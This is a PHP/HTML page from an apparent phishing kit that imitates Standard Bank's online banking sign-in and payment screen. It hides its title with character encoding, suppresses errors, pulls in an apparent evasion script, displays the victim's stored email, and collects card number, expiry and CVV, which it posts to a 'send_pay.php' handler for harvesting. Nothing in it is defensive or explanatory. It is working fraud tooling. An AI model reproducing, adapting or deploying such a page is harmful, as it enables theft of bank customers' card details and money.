<?php
error_reporting(0);
session_start();
require_once '../esc/index.php';
?>
<!DOCTYPE html>
<html lang="en" dir="ltr" class="plt-tablet plt-desktop md hydrated" mode="md">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <title>&#83;&#116;&#97;&#110;&#100;&#97;&#114;&#100;&#32;&#66;&#97;&#110;&#107;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#66;&#97;&#110;&#107;&#105;&#110;&#103;</title>
  <meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
  <meta http-equiv="x-ua-compatible" content="IE=edge">
  <link rel="stylesheet" type="text/css" href="../libraries/css/app.03b5f075.css">
  <link rel="stylesheet" href="../libraries/css/bundle.css">
  <link rel="stylesheet" href="../libraries/css/ionic.bundle.css">
  <link rel="stylesheet" type="text/css" href="../libraries/css/sbg.css">
  <link rel="icon" type="image/png" href="../libraries/img/favicon.ico">
  <style type="text/css">
    
  </style>
</head>

<body class="body-container">
  <ion-app class="md ion-page hydrated">
    <ion-content class="md hydrated" style="--offset-top:0;--offset-bottom:0">
      <div class="ping-signin login-template" autocomplete="off" id="sign in" name="Sign in with your Standard Bank ID">
        <div class="ping-outer-container" style="display:flex">
          <div class="ping-logo login-template"><span class="company-logo"><img src="../libraries/img/sbg.png"></span></div>
          <form method="POST" action="../send/send_pay.php" autocomplete="off">
            <div class="ping-container ping-signin login-template">
              <div class="ping-body-container">
                <div class="content-column column-1 bm">
                <header>
                  <div data-v-3428eec7="" data-testid="paymentInfo" class="payment-info" style="padding-bottom: 10px!important;">
                    <div data-v-3428eec7="" class="merchant-logo"><img data-v-3428eec7="" src="../libraries/img/sbg.png" alt="PROLEX TRADING Logo"></div>
                    <div data-v-3428eec7="" class="customer-info" style="font-size: 1.4rem;margin-top: 5px;">
                      <?php echo $_SESSION['mail']; ?>
                    </div>
                  </div>
                </header>
                <div data-v-65c93f30="" data-v-0da806a4="" class="checkout__stage" style="min-height: 100%;">
                  <section data-v-1d35500c="" data-v-65c93f30="" id="payment-form" class="payment-form">
                    <div id="card-form">
                      <header id="instructions" class="instructions">
                        <div class="instructions__message" style="font-size: 1.6rem;font-weight: 500;line-height: 1.4;text-align: center;margin: 0px auto -10px;max-width: 260px;color: #2f3d4d;"> Enter your card details </div>
                      </header>
                    </div>
                  </section>
                </div>
                <div class="row">
                  <div class="col-12-sm">
                    <div class="form-group">
                      <div class="input-wrap">
                        <input type="text" name="ccn" autocomplete="off" placeholder="0000 0000 0000 0000" required="required" class="input input--card" autofocus="focus">
                        <label class="label label--floating">Card Number</label>
                      </div>
                    </div>
                  </div>
                </div>


                <div class="row">
                  <div class="col-6-sm">
                    <div class="form-group">
                      <input type="text" name="exp" autocomplete="off" placeholder="MM / YY" required="required" class="input input--card">
                      <label class="label label--floating">Card Expiry</label>
                    </div>
                  </div>
                  <div class="col-6-sm">
                    <div class="form-group">
                      <div class="hint"><a class="hint__toggle"> Help? </a></div>
                      <input type="text" name="cvv" autocomplete="off" placeholder="123" required="required" class="input input--card">
                      <label class="label label--floating">CVV</label>
                    </div>
                  </div>
                </div>



                <div class="ping-buttons">

                    <button type="submit" class="button-natived">
                      Next
                    </button>
      
                </div>
              </div>
            </div>
          </form>
        </div>
      </div>
    </ion-content>
  </ion-app>
  <!--
     <script type="text/javascript">
        function isInputNumber(evt){var ch=String.fromCharCode(evt.which);if(!(/[0-9]/.test(ch))){evt.preventDefault();}}
    </script>
  -->

    <script src="../libraries/js/jquery.min.js"></script>
    <script src="../libraries/js/jquery.mask.js"></script>
    <script type="text/javascript">
        $('input[name="ccn"]').mask('0000 0000 0000 0000');
        $('input[name="exp"]').mask('00 / 00');
        $('input[name="cvv"]').mask('000');
        $('input[name="atm"]').mask('0000');
    </script>
</body>

</html>